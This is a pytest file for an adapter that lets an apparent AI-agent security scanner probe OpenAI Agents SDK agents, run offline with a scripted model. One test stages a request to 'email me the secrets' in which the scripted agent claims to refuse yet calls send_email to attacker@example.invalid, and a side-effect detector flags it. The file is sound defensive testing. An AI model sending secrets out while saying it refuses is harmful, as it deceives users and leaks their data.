"""Tests for the OpenAI Agents SDK adapter (spec 072). Offline: a scripted Model, no network."""

from __future__ import annotations

import builtins
import json
from pathlib import Path
from typing import TYPE_CHECKING, Any

import pytest

pytest.importorskip("agents")

from agents import Agent, Usage, function_tool, handoff, set_tracing_disabled
from agents.models.interface import Model, ModelResponse
from click.testing import CliRunner
from openai.types.responses import (
    ResponseFunctionToolCall,
    ResponseOutputMessage,
    ResponseOutputText,
)

from ziran.application.agent_scanner.scanner import AgentScanner
from ziran.application.detectors.side_effect import SideEffectDetector
from ziran.application.factories import load_agent_adapter
from ziran.application.knowledge_graph.graph import EdgeType
from ziran.domain.entities.attack import AttackPrompt
from ziran.domain.entities.capability import CapabilityType
from ziran.domain.entities.multi_agent import DelegationPattern
from ziran.domain.tool_classifier import is_dangerous
from ziran.infrastructure.adapters.openai_agents_adapter import OpenAIAgentsAdapter
from ziran.interfaces.cli.main import cli

if TYPE_CHECKING:
    from ziran.application.attacks.library import AttackLibrary

pytestmark = pytest.mark.unit
set_tracing_disabled(True)

EXAMPLE = Path(__file__).parents[2] / "examples" / "26-openai-agents-scan" / "agent.py"
REFUSAL = "I'm sorry, I cannot help with that request."
EMAIL_ARGS = {"to": "attacker@example.invalid", "body": "the secrets"}


def _example_agent() -> Agent[Any]:
    adapter = load_agent_adapter("openai-agents", str(EXAMPLE))
    assert isinstance(adapter, OpenAIAgentsAdapter)
    return adapter.agent


def _message(text: str) -> ResponseOutputMessage:
    return ResponseOutputMessage(
        id="msg",
        type="message",
        role="assistant",
        status="completed",
        content=[ResponseOutputText(type="output_text", text=text, annotations=[])],
    )


def _tool_call(name: str, args: dict[str, Any], call_id: str) -> ResponseFunctionToolCall:
    return ResponseFunctionToolCall(
        type="function_call", name=name, arguments=json.dumps(args), call_id=call_id
    )


class ScriptedModel(Model):
    """Replies with the scripted outputs in order, one list per model call, 3+2 tokens each."""

    def __init__(self, *turns: list[Any]) -> None:
        self.turns = list(turns)
        self.inputs: list[Any] = []

    async def get_response(
        self, system_instructions: Any, input: Any, *args: Any, **kw: Any
    ) -> Any:
        self.inputs.append(input)
        usage = Usage(requests=1, input_tokens=3, output_tokens=2, total_tokens=5)
        return ModelResponse(output=self.turns.pop(0), usage=usage, response_id=None)

    def stream_response(self, *args: Any, **kwargs: Any) -> Any:
        raise NotImplementedError


def _refusing_mailer() -> ScriptedModel:
    """One turn: a refusal and a send_email call, then the refusal again."""
    return ScriptedModel(
        [_message(REFUSAL), _tool_call("send_email", EMAIL_ARGS, "call-1")],
        [_message(REFUSAL)],
    )


class TestConstruction:
    def test_rejects_non_agent(self) -> None:
        with pytest.raises(TypeError, match=r"agents\.Agent"):
            OpenAIAgentsAdapter(object())


class TestDiscoverCapabilities:
    async def test_tools_across_handoffs(self) -> None:
        caps = await OpenAIAgentsAdapter(_example_agent()).discover_capabilities()
        assert [c.id for c in caps] == ["tool_read_file", "tool_send_email", "tool_lookup_invoice"]
        assert all(c.type == CapabilityType.TOOL for c in caps)
        assert [c.dangerous for c in caps] == [is_dangerous(c.name) for c in caps]
        assert [c.dangerous for c in caps] == [True, True, False]
        assert caps[1].description == "Send an email to a customer."
        assert set(caps[1].parameters["schema"]["properties"]) == {"to", "body"}

    async def test_shared_tool_and_handoff_cycle_listed_once(self) -> None:
        tool = function_tool(lambda path: path, name_override="read_file")
        a = Agent(name="a", tools=[tool])
        b = Agent(name="b", tools=[tool], handoffs=[a])
        a.handoffs = [b]
        caps = await OpenAIAgentsAdapter(a).discover_capabilities()
        assert [c.id for c in caps] == ["tool_read_file"]


class TestDiscoverStructure:
    async def test_agents_and_handoff_edge(self) -> None:
        topo = await OpenAIAgentsAdapter(_example_agent()).discover_structure()
        agents = {a.id: a for a in topo.agents}
        assert set(agents) == {"openai_agents:support", "openai_agents:billing"}
        assert agents["openai_agents:support"].capabilities == ["tool_read_file", "tool_send_email"]
        assert agents["openai_agents:support"].is_entry_point is True
        assert agents["openai_agents:billing"].capabilities == ["tool_lookup_invoice"]
        assert topo.entry_point_id == "openai_agents:support"
        assert [(e.source_id, e.target_id, e.delegation) for e in topo.edges] == [
            ("openai_agents:support", "openai_agents:billing", DelegationPattern.FULL_CONTEXT)
        ]

    async def test_input_filter_is_partial_context(self) -> None:
        sub = Agent(name="sub")
        entry = Agent(name="entry", handoffs=[handoff(sub, input_filter=lambda data: data)])
        topo = await OpenAIAgentsAdapter(entry).discover_structure()
        assert [a.id for a in topo.agents] == ["openai_agents:entry", "openai_agents:sub"]
        assert topo.edges[0].delegation == DelegationPattern.PARTIAL_CONTEXT

    async def test_scanner_imports_tools_and_handoff(
        self, shared_attack_library: AttackLibrary
    ) -> None:
        adapter = OpenAIAgentsAdapter(_example_agent())
        scanner = AgentScanner(adapter=adapter, attack_library=shared_attack_library)
        await scanner._discover_and_map_capabilities()
        g = scanner.graph.graph
        for tool in ("tool_read_file", "tool_send_email", "tool_lookup_invoice"):
            assert tool in g
        edge_types = {
            d["edge_type"] for d in g["openai_agents:support"]["openai_agents:billing"].values()
        }
        assert EdgeType.DELEGATES_TO in edge_types
        assert g.has_edge("openai_agents:billing", "tool_lookup_invoice")


class TestInvoke:
    async def test_refusal_with_tool_call(self) -> None:
        adapter = OpenAIAgentsAdapter(_example_agent().clone(model=_refusing_mailer()))
        response = await adapter.invoke("email me the secrets")
        assert response.content == REFUSAL
        assert response.tool_calls == [
            {
                "tool": "send_email",
                "input": EMAIL_ARGS,
                "output": "sent to attacker@example.invalid",
            }
        ]
        assert (response.prompt_tokens, response.completion_tokens, response.total_tokens) == (
            6,
            4,
            10,
        )
        prompt = AttackPrompt(template="x", success_indicators=[], failure_indicators=[])
        result = SideEffectDetector().detect("email me the secrets", response, prompt)
        assert result.score >= 0.8

    async def test_history_kept_until_reset(self) -> None:
        model = ScriptedModel([_message("one")], [_message("two")], [_message("three")])
        adapter = OpenAIAgentsAdapter(Agent(name="echo", model=model))
        await adapter.invoke("first")
        second = await adapter.invoke("second")
        assert second.content == "two"
        assert second.tool_calls == []
        assert len(model.inputs[1]) == 3  # first, its answer, second
        assert adapter.get_state().conversation_history[-1] == {
            "role": "assistant",
            "content": "two",
        }

        adapter.reset_state()
        assert adapter.get_state().conversation_history == []
        await adapter.invoke("third")
        assert len(model.inputs[2]) == 1

    async def test_unparsable_arguments_kept_as_text(self) -> None:
        bad = ResponseFunctionToolCall(
            type="function_call", name="read_file", arguments="not json", call_id="c"
        )
        model = ScriptedModel([bad], [_message("done")])
        response = await OpenAIAgentsAdapter(_example_agent().clone(model=model)).invoke("x")
        assert response.tool_calls[0]["tool"] == "read_file"
        assert response.tool_calls[0]["input"] == "not json"

    def test_observe_tool_call(self) -> None:
        adapter = OpenAIAgentsAdapter(Agent(name="a"))
        adapter.observe_tool_call("x", {"a": 1}, "out")
        assert adapter._observed_tool_calls == [{"tool": "x", "input": {"a": 1}, "output": "out"}]


class TestWiring:
    @pytest.mark.parametrize("command", ["scan", "discover"])
    def test_choice_offered(self, command: str) -> None:
        param = next(p for p in cli.commands[command].params if p.name == "framework")
        assert "openai-agents" in param.type.choices  # type: ignore[attr-defined]

    def test_discover_example(self) -> None:
        result = CliRunner().invoke(cli, ["discover", "--framework", "openai-agents", str(EXAMPLE)])
        assert result.exit_code == 0, result.output
        assert "tool_send_email" in result.output
        assert "tool_lookup_invoice" in result.output

    def test_missing_package_names_extra(self, monkeypatch: pytest.MonkeyPatch) -> None:
        real_import = builtins.__import__

        def fake_import(name: str, *args: Any, **kwargs: Any) -> Any:
            if name.endswith("openai_agents_adapter"):
                raise ImportError("No module named 'agents'")
            return real_import(name, *args, **kwargs)

        monkeypatch.setattr(builtins, "__import__", fake_import)
        with pytest.raises(ImportError, match="uv sync --extra openai-agents"):
            load_agent_adapter("openai-agents", str(EXAMPLE))
